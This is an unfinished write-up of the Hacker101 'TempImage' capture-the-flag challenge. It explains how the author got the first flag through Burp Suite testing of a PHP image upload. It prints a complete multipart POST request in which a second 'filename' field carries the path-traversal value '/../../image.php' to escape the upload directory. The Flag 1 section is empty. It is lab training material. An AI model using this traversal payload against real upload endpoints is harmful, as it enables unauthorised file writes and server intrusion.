# Hacker 101 CTF TempImage

---

#### Flag 0

-- <b>Hints</b> --

```html
<ul>
  <li>File uploads can be hard to pin down</li>
</ul>
```

For this first flag I did quite a bit of investigating with the trusty burp suite.
I tried the typical vectors of uploading phtml but nothing but errors asking for a png..

I found that when uploading an image however, there is a second Content-Disposition header... This could be interesting, so I tried to upload some php to the vector but still nothing.

At this point I went back to the redirect and saw /files/&lt;somehash-image-uploaded&gt; and the same within the header. So instead of uploading to the /files directory, what about getting to the /index with some directory traversal.

```http
POST /doUpload.php HTTP/2
Host: <target>
Content-Length: 254181
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysNSOkcevOPFbYBSC
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://2b3b4a8b0990d1f860b7f8a33cc32ce9.ctf.hacker101.com/upload.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


------WebKitFormBoundarysNSOkcevOPFbYBSC
Content-Disposition: form-data; name="file"; filename="image.png"
Content-Type: image/png

PNG
png data here

------WebKitFormBoundarysNSOkcevOPFbYBSC
Content-Disposition: form-data; name="filename"
/../../image.php

------WebKitFormBoundarysNSOkcevOPFbYBSC--
```

this returned a flag in the response

---

#### Flag 1

---
